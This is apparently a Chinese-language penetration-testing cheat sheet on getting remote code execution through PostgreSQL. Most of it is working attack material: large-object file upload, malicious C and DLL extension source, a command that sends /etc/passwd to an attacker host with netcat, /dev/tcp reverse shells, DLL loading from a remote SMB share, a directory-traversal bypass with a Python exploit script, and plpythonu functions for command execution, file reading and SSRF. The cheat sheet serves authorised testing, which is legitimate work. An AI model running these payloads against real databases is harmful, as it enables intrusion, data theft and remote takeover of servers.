---
attack_surface: [注入类]
impact: [远程代码执行, 权限提升]
risk_level: 严重
prerequisites:
  - PostgreSQL 架构理解
  - C 编译基础
  - PostgreSQL Extension 机制
difficulty: 高级
related_techniques:
  - postgresql-injection
  - mysql-injection
tools:
  - pgexec
  - PolyUDF
  - Metasploit (postgres_payload)
---

# PostgreSQL RCE — 扩展与语言执行

> 关联文档：[PostgreSQL Injection](../PostgreSQL%20Injection.md) · [SQL Injection 总览](../README.md)

---

# 0x01 大对象 (Large Object) 文件上传

PostgreSQL 的 `pg_largeobject` 表用于存储大型二进制数据，可通过 SQL 写入任意文件（包括 `.so`/`.dll` 扩展）。

## 1.1 数据分块

```bash
split -b 2048 your_file            # 按 2KB 分块
base64 -w 0 <Chunk_file>           # Base64 编码 (单行)
xxd -ps -c 99999999999 <Chunk_file> # Hex 编码 (单行)
```

> Hex 编码 → 每块 4KB；Base64 → `ceil(n/3) * 4`

## 1.2 lo_creat + Base64 上传

```sql
SELECT lo_creat(-1);        -- 创建空大对象 (返回 LOID)
SELECT lo_create(173454);   -- 指定固定 LOID

-- 按页插入数据 (每页 2KB)
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

-- 导出到文件系统
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);   -- 删除大对象
```

## 1.3 lo_import + Hex 上传

```sql
-- 先创建 LOID
SELECT lo_import('/path/to/existing/file');
SELECT lo_import('/path/to/file', 173454);

-- 按页更新
UPDATE pg_largeobject SET data=decode('<HEX>', 'hex') WHERE loid=173454 AND pageno=0;
UPDATE pg_largeobject SET data=decode('<HEX>', 'hex') WHERE loid=173454 AND pageno=1;

-- 导出
SELECT lo_export(173454, '/path/to/your_file');
```

---

# 0x02 RCE — Extensions (C 共享库)

## 2.1 Linux (PostgreSQL < 8.2)

```sql
-- 直接调用 libc 的 system()
CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer
  AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <port>');

-- 文件读写函数
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int
  AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int
  AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int
  AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```

## 2.2 Linux (PostgreSQL ≥ 8.2 — 需要 Magic Block)

PostgreSQL 8.2+ 要求扩展库包含 `PG_MODULE_MAGIC` 宏。需根据目标版本编译：

```bash
# 获取目标版本
SELECT version();  -- eg: PostgreSQL 9.6.3

# 安装匹配的 dev 包
apt install postgresql-server-dev-9.6

# 编译恶意扩展
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
```

```c
// pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
    char* command = PG_GETARG_CSTRING(0);
    PG_RETURN_INT32(system(command));
}
```

```sql
-- 上传后加载
CREATE FUNCTION sys(cstring) RETURNS int
  AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
```

**预编译库 + 自动化**：[pgexec](https://github.com/Dionach/pgexec)

## 2.3 Windows RCE

```c
// DLL ShellExecute
PG_FUNCTION_INFO_V1(pgsql_exec);
Datum pgsql_exec(PG_FUNCTION_ARGS) {
    int instances = PG_GETARG_INT32(1);
    for (int c = 0; c < instances; c++) {
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
    PG_RETURN_VOID();
}
```

```sql
-- 从远程 SMB 共享加载 DLL
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void
  AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
```

**DLL Main 反弹 shell** — 恶意代码在 `DllMain` 中，加载 DLL 即触发：

```sql
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int
  AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
-- 无需 SELECT 调用 → DLL 加载即执行反弹 shell
```

**Windows 预编译库**：[PolyUDF](https://github.com/rop-la/PolyUDF)

## 2.4 最新 PostgreSQL 版本绕过 (目录遍历)

新版本限制扩展只能从特定目录加载（如 `C:\Program Files\PostgreSQL\11\lib` 或 `/var/lib/postgresql/11/lib`）。

**绕过**：CREATE FUNCTION 允许目录遍历到 data 目录：

```sql
-- 用大对象上传 DLL 到 data 目录 → 目录遍历加载
CREATE FUNCTION connect_back(text, integer) RETURNS void
  AS '../data/poc', 'connect_back' LANGUAGE C STRICT;
SELECT connect_back('192.168.100.54', 1234);
-- 注意: 不需要 .dll 后缀, CREATE FUNCTION 自动追加
```

```python
# 完整利用脚本 (SourceIn)
import sys
host, port, lib = sys.argv[1], int(sys.argv[2]), sys.argv[3]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "SELECT lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start, end = i*2048, (i+1)*2048
    if i == 0:
        sql += f"UPDATE pg_largeobject SET pageno={i}, data=decode('{d[start:end].hex()}', 'hex') WHERE loid=1337;"
    else:
        sql += f"INSERT INTO pg_largeobject(loid, pageno, data) VALUES (1337, {i}, decode('{d[start:end].hex()}', 'hex'));"
sql += "SELECT lo_export(1337, 'poc.dll');"
sql += "CREATE FUNCTION connect_back(text, integer) RETURNS void AS '../data/poc', 'connect_back' LANGUAGE C STRICT;"
sql += f"SELECT connect_back('{host}', {port});"
```

---

# 0x03 RCE — 脚本语言

## 3.1 检查可用语言

```sql
\dL *
SELECT lanname, lanpltrusted, lanacl FROM pg_language;
-- 重点关注 untrusted 版本 (名称以 'u' 结尾):
-- plpythonu, plpython3u, plperlu, pljavaU, plrubyu
```

## 3.2 plpythonu / plpython3u

```sql
-- 基础 RCE
CREATE OR REPLACE FUNCTION exec(cmd text)
RETURNS VARCHAR(65535) stable
AS $$
  import os
  return os.popen(cmd).read()
$$
LANGUAGE 'plpythonu';
SELECT exec('ls -la');

-- 文件读取
CREATE OR REPLACE FUNCTION read(path text)
RETURNS VARCHAR(65535) stable
AS $$
  import base64
  return base64.b64encode(open(path).read()).decode('utf-8')
$$
LANGUAGE 'plpythonu';
SELECT read('/etc/passwd');

-- HTTP 请求 (SSRF)
CREATE OR REPLACE FUNCTION req3(url text)
RETURNS VARCHAR(65535) stable
AS $$
  from urllib import request
  return request.urlopen(url).read()
$$
LANGUAGE 'plpythonu';
SELECT req3('https://google.com');

-- 查找可写目录
CREATE OR REPLACE FUNCTION findw(dir text)
RETURNS VARCHAR(65535) stable
AS $$
  import os
  def my_find(path):
    writables = []
    def find_writable(path):
      if not os.path.isdir(path): return
      if os.access(path, os.W_OK): writables.append(path)
      if os.listdir(path):
        for item in os.listdir(path):
          find_writable(os.path.join(path, item))
    find_writable(path)
    return writables
  return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';
SELECT findw('/');
```

## 3.3 语言信任提升

如果语言为 untrusted (`lanpltrusted=false`)，尝试提升：

```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
-- 检查权限: SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```

## 3.4 加载未安装语言 (需要 superuser)

```sql
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```

---

# 0x04 参考资料

- [Dionach — PostgreSQL 9.x Remote Command Execution](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
- [SourceIn — Double-Uppercut: RCE Against PostgreSQL](https://srcin.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)
- [pgexec — Precompiled PostgreSQL Extensions](https://github.com/Dionach/pgexec)
- [PolyUDF — Windows PostgreSQL DLL](https://github.com/rop-la/PolyUDF)
- [Metasploit — postgres_payload](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload)
